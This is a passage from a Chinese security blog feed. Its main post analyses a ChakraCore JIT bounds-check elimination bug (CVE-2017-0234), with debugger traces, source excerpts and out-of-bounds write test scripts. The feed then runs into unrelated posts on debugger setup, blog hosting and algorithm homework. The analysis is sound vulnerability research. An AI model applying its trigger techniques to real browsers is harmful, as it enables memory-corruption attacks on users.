C:\windows\System32\sechost.dll</span><br><span class="line">ModLoad: 00007ffc`53b90000 00007ffc`53c31000   C:\windows\System32\ADVAPI32.dll</span><br><span class="line">ModLoad: 00007ffc`406c0000 00007ffc`40869000   C:\windows\SYSTEM32\dbghelp.dll</span><br><span class="line">ModLoad: 00007ffc`40b50000 00007ffc`40b79000   C:\windows\SYSTEM32\dbgcore.DLL</span><br><span class="line">ModLoad: 00007ffc`54190000 00007ffc`541bd000   C:\windows\System32\IMM32.DLL</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">KERNEL32!VirtualAllocStub:</span><br><span class="line">00007ffc`53f99800 48ff2569c60500  jmp     qword ptr [KERNEL32!_imp_VirtualAlloc (00007ffc`53ff5e70)] ds:00007ffc`53ff5e70=&#123;KERNELBASE!VirtualAlloc (00007ffc`532aafc0)&#125;</span><br><span class="line">…</span><br><span class="line">0:000&gt; k</span><br><span class="line"> # Child-SP          RetAddr           Call Site</span><br><span class="line">00 00000030`208fec08 00007ffc`0e34bfe2 KERNEL32!VirtualAllocStub</span><br><span class="line">01 00000030`208fec10 00007ffc`0e252610 chakracore!Memory::X64WriteBarrierCardTableManager::Initialize+0x82 [d:\chakracore\chakracore\lib\common\memory\recyclerwritebarriermanager.cpp @ 232] </span><br><span class="line">02 00000030`208fec70 00007ffc`0f0e647d chakracore!`dynamic initializer for &apos;Memory::RecyclerWriteBarrierManager::cardTable&apos;&apos;+0x10 [d:\chakracore\chakracore\lib\common\memory\recyclerwritebarriermanager.cpp @ 29] </span><br><span class="line">03 00000030`208feca0 00007ffc`0f0641bd chakracore!_initterm+0x5d [d:\th\minkernel\crts\ucrt\src\appcrt\startup\initterm.cpp @ 22] </span><br><span class="line">04 00000030`208fece0 00007ffc`0f0640b7 chakracore!dllmain_crt_process_attach+0xbd [f:\dd\vctools\crt\vcstartup\src\startup\dll_dllmain.cpp @ 67] </span><br><span class="line">05 00000030`208fed30 00007ffc`0f064345 chakracore!dllmain_crt_dispatch+0x47 [f:\dd\vctools\crt\vcstartup\src\startup\dll_dllmain.cpp @ 133] </span><br><span class="line">06 00000030`208fed70 00007ffc`0f0644c1 chakracore!dllmain_dispatch+0x75 [f:\dd\vctools\crt\vcstartup\src\startup\dll_dllmain.cpp @ 190] </span><br><span class="line">07 00000030`208fedc0 00007ffc`5622485f chakracore!_DllMainCRTStartup+0x31 [f:\dd\vctools\crt\vcstartup\src\startup\dll_dllmain.cpp @ 249] </span><br><span class="line">08 00000030`208fedf0 00007ffc`5624d762 ntdll!LdrpCallInitRoutine+0x6b</span><br><span class="line">09 00000030`208fee60 00007ffc`5624d5ab ntdll!LdrpInitializeNode+0x15a</span><br><span class="line">0a 00000030`208fef80 00007ffc`56247045 ntdll!LdrpInitializeGraphRecurse+0x73</span><br><span class="line">0b 00000030`208fefc0 00007ffc`5621d690 ntdll!LdrpPrepareModuleForExecution+0xc5</span><br><span class="line">0c 00000030`208ff000 00007ffc`5621d273 ntdll!LdrpLoadDllInternal+0x1a4</span><br><span class="line">0d 00000030`208ff080 00007ffc`5621c3cc ntdll!LdrpLoadDll+0x107</span><br><span class="line">0e 00000030`208ff220 00007ffc`5328eb02 ntdll!LdrLoadDll+0x8c</span><br><span class="line">0f 00000030`208ff320 00007ffc`532ba6d1 KERNELBASE!LoadLibraryExW+0x152</span><br><span class="line">10 00000030`208ff390 00007ff6`ee0d5509 KERNELBASE!LoadLibraryExA+0x31</span><br><span class="line">11 00000030`208ff3d0 00007ff6`ee0d55e9 CH!LoadChakraCore+0x19 [d:\chakracore\chakracore\bin\ch\chakrartinterface.cpp @ 38] </span><br><span class="line">12 00000030`208ff400 00007ff6`ee0d51ac CH!ChakraRTInterface::LoadChakraDll+0xd9 [d:\chakracore\chakracore\bin\ch\chakrartinterface.cpp @ 67] </span><br><span class="line">13 00000030`208ff7b0 00007ff6`ee0efee4 CH!wmain+0x61c [d:\chakracore\chakracore\bin\ch\ch.cpp @ 942] </span><br><span class="line">14 00000030`208ff910 00007ff6`ee0efdf7 CH!invoke_main+0x34 [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 80] </span><br><span class="line">15 00000030`208ff950 00007ff6`ee0efcbe CH!__scrt_common_main_seh+0x127 [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 253] </span><br><span class="line">16 00000030`208ff9b0 00007ff6`ee0efef9 CH!__scrt_common_main+0xe [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 296] </span><br><span class="line">17 00000030`208ff9e0 00007ffc`53f92784 CH!wmainCRTStartup+0x9 [f:\dd\vctools\crt\vcstartup\src\startup\exe_wmain.cpp @ 17] </span><br><span class="line">18 00000030`208ffa10 00007ffc`56270d51 KERNEL32!BaseThreadInitThunk+0x14</span><br><span class="line">19 00000030`208ffa40 00000000`00000000 ntdll!RtlUserThreadStart+0x21</span><br></pre></td></tr></table></figure></p><p>于是全局搜索MEM_COMMIT，在ArrayBuffer.h里找到线索，并调试确认。<br>结论如下：<br>在为ArrayBuffer进行内存分配时，会对长度有一个判断。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-08-032016.jpg" alt=""><br>并根据这个判断的返回结果，决定使用Virtual Alloc（AllocWrapper是一个包装）还是malloc来分配内存。<br>这主要是根据length的长度和”标志位“。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-08-032100.jpg" alt=""><br>如果是用Virtual Alloc分配(关于这种分配方式的参数，可以参考<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85" target="_blank" rel="noopener">MSDN</a>.aspx))<br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-08-032346.jpg" alt=""><br>那么为ArrayBuffer分配的保留空间大小为4GB<br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-08-032430.jpg" alt=""><br>随后COMMIT真正使用的大小，也就是PoC里的0x10000<br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-08-032701.jpg" alt=""></p><p>JIT在优化的时候会因为我们给这个Buffer分配的内存足够大（4GB），就去掉了边界检查，但其实这是一个安全隐患。</p><h3 id="Pattern匹配"><a href="#Pattern匹配" class="headerlink" title="Pattern匹配"></a>Pattern匹配</h3><p>我尝试着替换ArrayBuffer，寻找和此处bug逻辑相似的地方，在源码里搜索，不过暂时没有找到疑似的地方。</p><h3 id="触发条件-修改PoC"><a href="#触发条件-修改PoC" class="headerlink" title="触发条件(修改PoC)"></a>触发条件(修改PoC)</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (baseValueType.IsLikelyOptimizedVirtualTypedArray() &amp;&amp; !Js::IsSimd128LoadStore(instr-&gt;m_opcode) <span class="comment">/*Always extract bounds for SIMD */</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">if</span> (isProfilableStElem ||</span><br><span class="line">         !instr-&gt;IsDstNotAlwaysConvertedToInt32() ||</span><br><span class="line">         ( (baseValueType.GetObjectType() == ObjectType::Float32VirtualArray ||</span><br><span class="line">           baseValueType.GetObjectType() == ObjectType::Float64VirtualArray) &amp;&amp;</span><br><span class="line">           !instr-&gt;IsDstNotAlwaysConvertedToNumber()</span><br><span class="line">         )</span><br><span class="line">        )</span><br><span class="line">     &#123;</span><br><span class="line">         eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">         eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">         canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><ol><li>替换控制ArrayBuffer的对象</li><li>测试case</li></ol><h4 id="TypeView"><a href="#TypeView" class="headerlink" title="TypeView"></a>TypeView</h4><p>PoC里用的是Uint32Array，其实TypedView只要宽度大于一个字节都是可以的<br>下面这些都测试成功。（其实主要常用的写exp的还是FloatArray）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Uint8Array();-</span><br><span class="line">Uint16Array();+</span><br><span class="line">Uint32Array();+</span><br><span class="line"></span><br><span class="line">Int8Array();-</span><br><span class="line">Int16Array();+</span><br><span class="line">Int32Array();+</span><br><span class="line"></span><br><span class="line">Float32Array();+</span><br><span class="line">Float64Array();+</span><br></pre></td></tr></table></figure></p><h4 id="DataView"><a href="#DataView" class="headerlink" title="DataView"></a>DataView</h4><ul><li>JSObject<ul><li>JSArray<ul><li>JSArrayBuffer</li><li>JSArrayBufferView<ul><li>JSTypedArray</li><li>JSDataView</li></ul></li></ul></li></ul></li></ul><p>ArrayBuffer需要用TypedArray或DataView来实际访问。<br>而为了Exploit，最好不要做多余的事情（当发生意想不到的事情时很麻烦），因此比起DataView，我们更多的使用TypedArray。<br>不过我这里还是测试了一下DataView，没有成功。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">begin, end, step, num</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = begin; i &lt; end; i += step)</span><br><span class="line">     view.setInt32(i,num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000</span>);</span><br><span class="line"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line">write(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">1</span>, <span class="number">0x1234</span>);</span><br><span class="line">write(<span class="number">0x3000000e</span>, <span class="number">0x40000010</span>, <span class="number">0x10000</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ /d/chakracore/ChakraCore/Build/VcBuild/bin/x64_debug/ch.exe test3.js</span><br><span class="line">TypeError: DataView operation access beyond specified buffer length</span><br><span class="line">   at write (d:\cve-2017-0234\test3.js:3:6)</span><br><span class="line">   at Global code (d:\cve-2017-0234\test3.js:9:1)</span><br></pre></td></tr></table></figure><p><img src="http://onc55v8te.bkt.clouddn.com/2018-07-08-041938.jpg" alt=""><br>全局搜索报错字符串并查找引用寻找原因。<br> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-08-042028.jpg" alt=""></p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>在patch后，要触发需要构造常数边界(上面有分析)<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (isProfilableStElem ||</span><br><span class="line">            !instr-&gt;IsDstNotAlwaysConvertedToInt32() ||</span><br><span class="line">            ( (baseValueType.GetObjectType() == ObjectType::Float32VirtualArray ||</span><br><span class="line">              baseValueType.GetObjectType() == ObjectType::Float64VirtualArray) &amp;&amp;</span><br><span class="line">              !instr-&gt;IsDstNotAlwaysConvertedToNumber()</span><br><span class="line">            )</span><br></pre></td></tr></table></figure></p><p>isProfilableStElem显然是JIT优化时用来采集的一个标志，所以通过循环生成JIT的时候就可以走进if body。<br>但是其他和IR有关的“||”选项显然是不能放过的线索，可以测试如何走进这些路径。</p><h3 id="开发者的assumption"><a href="#开发者的assumption" class="headerlink" title="开发者的assumption"></a>开发者的assumption</h3><h4 id="assumption"><a href="#assumption" class="headerlink" title="assumption"></a>assumption</h4><p>如图可知，传入的length的最大长度为MaxArrayBufferLength，length的类型是uint32即最大值2^32-1<br>MaxArrayBufferLength    0x7fffffff    const unsigned int<br>这里即是对要分配的buffer的空间大小的一次校验。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-17-031659.jpg" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-17-031809.jpg" alt=""></p><p>而采用VirtualAlloc一次分配的大小是4GB即2^32<br><code>#define MAX_ASMJS_ARRAYBUFFER_LENGTH 0x100000000 //4GB</code><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-17-031827.jpg" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-17-031841.jpg" alt=""><br>然而在通过索引访问buffer的时候，索引的类型也是uint32的。<br>于是若是数组索引，按照单个元素size同比扩容之后，则有可能超过4GB的虚拟内存（即length最大可以申请到4G，但是访问可以是4G*x）。<br>而对于访问超过分配的buffer但是在VirtualAlloc分配的4G内的越界读写会直接会由硬件进行捕获。<br>我推测开发者在写代码的时候，正是没有注意到这一点，于是只是简单的出于性能优化的考虑，错误的判断了索引无论如何都不可能超出保留的大空间越界访问（因为4G是“最大”了，而在4G内的越界访问都会被硬件捕获并终止）<br>于是就直接去掉了边界。 </p><h4 id="other"><a href="#other" class="headerlink" title="other"></a>other</h4><p>最简单也是最常见的可优化边界检查代码就是处在循环里的边界检查。</p><p>我们假设循环具有迭代变量i，且初值为init, 终值为fin，i++<br>只有循环控制代码修改i<br>假设必须要满足的范围是<code>lo &lt; i &lt; hi</code><br>本来循环应该是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    i &lt;- init</span><br><span class="line">L1: ...</span><br><span class="line">    if i &lt; lo trap</span><br><span class="line">    if i &gt; hi trap</span><br><span class="line">    use of i that must satisfy lo &lt;= i &lt;=hi</span><br><span class="line">    ....</span><br><span class="line">    i &lt;- i + 1</span><br><span class="line">    if i &lt;= fin goto L1</span><br></pre></td></tr></table></figure></p><p>最容易处理的情况是i为常量v，则只需要将检查lo &lt; i &lt; hi的代码外提到循环的前置块里即可</p><p>下一种稍微复杂一点的情况是i为变量，这样我们就要处理范围表达式lo &lt; i &lt; hi（比如说分配的数组最大空间不超过hi，最小不小于0）<br>其中i是循环控制变量，在这种情况下，只需要lo &lt; init且 fin &lt; hi ， 就能满足范围表达式<br>于是我们可以这么做<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    if lo &gt; init trap (i的初始值为init，如果init 比 i需满足的最小值还小，则trap</span><br><span class="line">    t1 &lt;- min(fin, hi)</span><br><span class="line">    i &lt;- init</span><br><span class="line">L1: ...</span><br><span class="line">    use of i that must satisfy lo &lt;= i &lt;= hi</span><br><span class="line">    ....</span><br><span class="line">    i &lt;- i + 1</span><br><span class="line">    if i &lt;= t1 goto L1</span><br><span class="line">    if i &lt;= fin trap 6(i本应该到达fin，如果i不能到达它本来应该到达的值，就trap</span><br></pre></td></tr></table></figure></p><h3 id="GC和VirtualAlloc在安全性上的区别"><a href="#GC和VirtualAlloc在安全性上的区别" class="headerlink" title="GC和VirtualAlloc在安全性上的区别"></a>GC和VirtualAlloc在安全性上的区别</h3><p>GC虽然也是由VirtualAlloc分配的空间，但是GC通过一系列的管理机制使得安全性大大提高，如isolate heap和延迟释放等<br><strong>MemGC将仍被引用的chunk标记</strong>,使得UAF的利用变的困难。<br>且将带索引的对象如array,TypedArray等隔离，使得<strong>能用来利用的可用对象</strong>大大缩减。<br>ArrayBuffer构造函数可以根据分配的buffer的length长度不同，来使用两个不同的分配器（malloc或VirtualAlloc）来分配内存，在分配大数组的时候，使得内存回收和分配变的更快捷，但是同时也给漏洞利用提供了便利。</p><p>看了一些资料（比如CVE-2016-7288这个edge UAF的利用，还有一些零散的PPT和GC源码），有一些理解了，不过想真正学会控制内存，还需要更多实际的调试和利用。</p><h4 id="Windbg常用命令"><a href="#Windbg常用命令" class="headerlink" title="Windbg常用命令"></a>Windbg常用命令</h4><ul><li>dd memory<br>打印内存</li><li>u<br>打印汇编</li><li>k<br>查看堆栈<h4 id="一些trick"><a href="#一些trick" class="headerlink" title="一些trick"></a>一些trick</h4></li></ul><ol><li>寻找JIT代码<br>定位CallLoopBody，它的参数就是JIT代码地址。</li><li>寻找生成JIT代码的地方可以考虑在Func::Codegen那里下断。</li><li>审计一下用到的对象命名的头文件，比如ArrayBuffer.h，可能有有趣的发现。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;vs调试环境配置&quot;&gt;&lt;a href=&quot;#vs调试环境配置&quot; class=&quot;headerlink&quot; title=&quot;vs调试环境配置&quot;&gt;&lt;/a&gt;vs调试环境配置&lt;/h3&gt;&lt;h4 id=&quot;编译&quot;&gt;&lt;a href=&quot;#编译&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="edge" scheme="http://eternalsakura13.com/tags/edge/"/>
    
  </entry>
  
  <entry>
    <title>firefox调试环境搭建</title>
    <link href="http://eternalsakura13.com/2018/07/03/firefox_env/"/>
    <id>http://eternalsakura13.com/2018/07/03/firefox_env/</id>
    <published>2018-07-03T13:30:32.951Z</published>
    <updated>2018-07-03T13:41:19.259Z</updated>
    
    <content type="html"><![CDATA[<h2 id="firefox调试环境搭建"><a href="#firefox调试环境搭建" class="headerlink" title="firefox调试环境搭建"></a>firefox调试环境搭建</h2><h3 id="关闭firefox多进程"><a href="#关闭firefox多进程" class="headerlink" title="关闭firefox多进程"></a>关闭firefox多进程</h3><p> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-03-133104.jpg" alt=""><br>打开firefox，访问aboutt:config，如图设置为false。</p><h3 id="windbg配置"><a href="#windbg配置" class="headerlink" title="windbg配置"></a>windbg配置</h3><p>我是从windows store下载的windbg preview<br> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-03-133125.jpg" alt=""><br> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-03-133137.jpg" alt=""><br>界面好看<br>然后配置一下符号服务器：<code>SRV*c:\mysymbol*http://symbols.mozilla.org</code><br> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-03-133149.jpg" alt=""></p><h3 id="shadow配置"><a href="#shadow配置" class="headerlink" title="shadow配置"></a>shadow配置</h3><p><a href="https://github.com/CENSUS/shadow" target="_blank" rel="noopener">https://github.com/CENSUS/shadow</a></p><p> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-03-133157.jpg" alt=""><br>然后下载<a href="https://githomelab.ru/pykd" target="_blank" rel="noopener">pykd</a>，其实就是一个dll<br>配置好python环境，下载<a href="https://www.python.org/ftp/python/2.7.11/python-2.7.11.amd64.msi" target="_blank" rel="noopener">python2.7.11</a>，用高版本会出bug。<br>然后<code>pip install pykd</code><br>注意pip需要配置一下终端代理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set http_proxy=http://127.0.0.1:1080</span><br><span class="line">set https_proxy=https://127.0.0.1:1080</span><br></pre></td></tr></table></figure></p><p>然后测试使用</p><h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><h4 id="attach"><a href="#attach" class="headerlink" title="attach"></a>attach</h4><p> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-03-133207.jpg" alt=""></p><h4 id="载入pykd-dll，从而可以在windbg执行py"><a href="#载入pykd-dll，从而可以在windbg执行py" class="headerlink" title="载入pykd.dll，从而可以在windbg执行py"></a>载入pykd.dll，从而可以在windbg执行py</h4><p><code>!load 路径\pykd.dll</code><br> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-03-133213.jpg" alt=""></p><h4 id="启动shadow"><a href="#启动shadow" class="headerlink" title="启动shadow"></a>启动shadow</h4><p><code>!py d:\useful\shadow\pykd_driver.py</code></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-07-03-133220.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;firefox调试环境搭建&quot;&gt;&lt;a href=&quot;#firefox调试环境搭建&quot; class=&quot;headerlink&quot; title=&quot;firefox调试环境搭建&quot;&gt;&lt;/a&gt;firefox调试环境搭建&lt;/h2&gt;&lt;h3 id=&quot;关闭firefox多进程&quot;&gt;&lt;a href
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="edge" scheme="http://eternalsakura13.com/tags/edge/"/>
    
  </entry>
  
  <entry>
    <title>hexo blog搭建及域名解析</title>
    <link href="http://eternalsakura13.com/2018/06/30/blog_build/"/>
    <id>http://eternalsakura13.com/2018/06/30/blog_build/</id>
    <published>2018-06-30T01:49:47.147Z</published>
    <updated>2018-06-30T02:00:26.994Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近有个小傻子弄不好域名解析。。我写一下吧。</p><h2 id="blog搭建"><a href="#blog搭建" class="headerlink" title="blog搭建"></a>blog搭建</h2><p>参考我学弟写的就可以，很详细<br><a href="https://kabeor.cn/Hexo+GitPage%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" target="_blank" rel="noopener">https://kabeor.cn/Hexo+GitPage%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</a></p><h2 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h2><p>我域名在主机壳买的，安利一下<br><a href="https://www.zhujike.com/" target="_blank" rel="noopener">https://www.zhujike.com/</a><br>买了之后可以在域名列表里看到<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-30-015647.png" alt=""><br>然后可以在域名解析里添加域名解析<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-30-015720.png" alt=""><br>具体的</p><ul><li>@<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-30-015731.png" alt=""></li><li>www<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-30-015747.png" alt=""><h2 id="hexo-CNAME"><a href="#hexo-CNAME" class="headerlink" title="hexo CNAME"></a>hexo CNAME</h2>然后在如图路径下建立一个CNAME文件<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-30-015835.png" alt=""><br>内容就是你的域名了。<br>然后同步一下，等一会就解析好了。<h2 id="关于博客管理"><a href="#关于博客管理" class="headerlink" title="关于博客管理"></a>关于博客管理</h2>建议写好分类和标签<br>能用tag来分的小类不要用categories来分<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-30-020002.png" alt=""><br>其他的多读wiki，等我哪天博客重建了再写。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近有个小傻子弄不好域名解析。。我写一下吧。&lt;/p&gt;
&lt;h2 id=&quot;blog搭建&quot;&gt;&lt;a href=&quot;#blog搭建&quot; class=&quot;he
      
    
    </summary>
    
      <category term="杂项" scheme="http://eternalsakura13.com/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
      <category term="blog搭建" scheme="http://eternalsakura13.com/tags/blog%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>algorithm期末考试</title>
    <link href="http://eternalsakura13.com/2018/06/29/algorithm/"/>
    <id>http://eternalsakura13.com/2018/06/29/algorithm/</id>
    <published>2018-06-28T17:06:05.140Z</published>
    <updated>2018-06-28T17:22:04.668Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简单背包问题"><a href="#简单背包问题" class="headerlink" title="简单背包问题"></a>简单背包问题</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-28-171258.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> data[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">weight</span><span class="params">(<span class="keyword">int</span> w, <span class="keyword">int</span> n)</span><span class="comment">//w是重量，n是剩下的件数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (w == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (w!=<span class="number">0</span>&amp;&amp;n == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (weight(w - data[n], n - <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> weight(w, n - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> w, n;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span>&gt;&gt;w&gt;&gt;n) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (weight(w, n)) &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"YES"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"NO"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Buyer"><a href="#Buyer" class="headerlink" title="Buyer"></a>Buyer</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-28-171631.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span 